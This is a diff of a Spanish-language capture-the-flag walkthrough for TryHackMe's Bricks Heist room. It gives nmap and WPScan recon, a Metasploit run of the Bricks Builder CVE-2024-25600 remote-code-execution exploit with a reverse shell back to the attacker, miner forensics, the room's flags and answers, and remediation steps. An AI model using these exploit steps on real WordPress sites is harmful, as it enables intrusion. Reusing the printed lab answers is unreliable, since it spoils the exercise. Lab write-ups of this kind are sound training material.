@@ -1,8 +1,151 @@
 # Walkthrough Técnico - Bricks Heist
 
-## Fase 1: Reconocimiento (Recon)
-Utilicé `nmap` para escanear los puertos abiertos.
-```bash
-nmap -sC -sV -oN inicial.log [IP_OBJETIVO]
+## Fase 0: Configuración inicial
+1. Configurar el Host
+# Editar archivo de hosts
+sudo nano /etc/hosts
+# Agregar línea:
+10.x.x.x bricks.thm
 
-## Fase 2:
+2.Verificar Conectividad
+ping -c 3 bricks.thm
+# Esperar respuesta del servidor
+
+## Fase 1: Reconocimiento (Recon)
+3.Escaneo de Puertos con Nmap
+nmap -sC -sV -oN escaneo_inicial.txt bricks.thm
+-Resultado clave: Puerto 443 (HTTPS) abierto → WordPress detectado
+
+4.Enumeración de WordPress con WPScan
+wpscan --url https://bricks.thm --enumerate p,t,u --disable-tls-checks
+-Hallazgo crítico: 
+WordPress theme in use: bricks
+Version: 1.9.5 (80% confidence)
+
+5.Investigación de Vulnerabilidades
+# Buscar CVE para Bricks Builder 1.9.5
+Resultado: CVE-2024-25600 - RCE no autenticada (CVSS 9.8)
+
+## Fase 2: Explotación
+6.Ejecutar Exploit (Metasploit)
+msfconsole
+search wp_bricks_builder_rce
+use exploit/multi/http/wp_bricks_builder_rce
+
+  set RHOSTS bricks.thm
+  set RPORT 443
+  set TARGETURI /
+  set LHOST <TU_IP>
+  set LPORT 4444
+  set AutoCheck false
+  set ForceExploit true
+  set SSL true
+
+  exploit
+  
+7.Verificar Acceso
+# En Meterpreter:
+whoami
+id
+pwd
+-Confirmación: Shell obtenida como usuario www-data
+
+## Fase 3: Post-Explotación y Forense
+8.Buscar Archivo .txt Oculto (Pregunta 1)
+# En Meterpreter:
+ls -la /var/www/html/
+# O buscar específicamente:
+find -f "*.txt" -d /var/www
+-Hallazgo: 650c844110baced87e1606453b93f22a.txt
+  cat /data/www/default/650c844110baced87e1606453b93f22a.txt
+
+✅ RESPUESTA 1: THM{fl46_650c844110baced87e1606453b93f22a}
+
+9.Listar Procesos (Pregunta 2)
+  ps
+-Análisis: Buscar procesos sospechosos:
+  -Nombres que imitan procesos del sistema
+  -Rutas en /lib/NetworkManager/
+-Hallazgo: Proceso nm-inet-dialog en /lib/NetworkManager/
+
+✅ RESPUESTA 2: nm-inet-dialog
+
+10.Identificar Servicio de Persistencia (Pregunta 3)
+ls /etc/systemd/system/
+cat /etc/systemd/system/ubuntu.service
+-Contenido encontrado:
+
+  [Unit]
+Description=TRYHACK3M
+
+[Service]
+Type=simple
+ExecStart=/lib/NetworkManager/nm-inet-dialog
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+
+✅ RESPUESTA 3: ubuntu (nombre del archivo: ubuntu.service)
+
+11.Encontrar Log del Miner (Pregunta 4)
+ls -la /lib/NetworkManager/
+cat /lib/NetworkManager/inet.conf
+-Hallazgo: Archivo inet.conf contiene logs del miner con entradas como:
+  [*] Status: Mining!
+  [*] Bitcoin Miner Thread Started
+
+✅ RESPUESTA 4: inet.conf
+
+12.Extraer Wallet Address (Pregunta 5)
+En inet.conf, encontrar la cadena codificada:
+  ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+Decodificar, en mi caso con Kali:
+# Primero de Hex a bytes, luego Base64 decode
+echo "5757314e..." | xxd -r -p | base64 -d
+
+✅ RESPUESTA 5: bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+
+13.Identificar Threat Group (Pregunta 6) - OSINT
+# Buscar la wallet en:
+# 1. Google: "<wallet_address> threat group"
+# 2. VirusTotal: https://www.virustotal.com/
+# 3. Blockchain explorers: Etherscan, Blockchain.com
+# 4. Reportes de seguridad: CrowdStrike, Mandiant, SecureList
+
+✅ RESPUESTA 6: LockBit
+
+## Fase 4: Remediación (Bonus)
+14.Contención Inmediata
+# Detener servicio malicioso
+systemctl stop ubuntu.service
+systemctl disable ubuntu.service
+rm /etc/systemd/system/ubuntu.service
+systemctl daemon-reload
+
+# Eliminar binario y configuración del miner
+rm /lib/NetworkManager/nm-inet-dialog
+rm /lib/NetworkManager/inet.conf
+
+# Matar procesos activos
+pkill -f nm-inet-dialog
+
+15.Parcheo de Vulnerabilidades
+# Actualizar Bricks Builder desde WordPress Admin
+# O manualmente:
+cd /data/www/default/wp-content/themes/
+rm -rf bricks/
+# Descargar e instalar versión 1.9.6.1+
+
+# Corregir permisos de wp-config.php
+chmod 640 /data/www/default/wp-config.php
+chown www-data:www-data /data/www/default/wp-config.php
+
+# Restringir phpMyAdmin o eliminar acceso público
+
+16. Hardening Post-Incidente
+# Rotar todas las credenciales
+# Implementar WAF
+# Configurar monitoreo de integridad (AIDE/Tripwire)
+# Establecer alertas para procesos con alto CPU
+# Revisar logs de autenticación: /var/log/auth.log
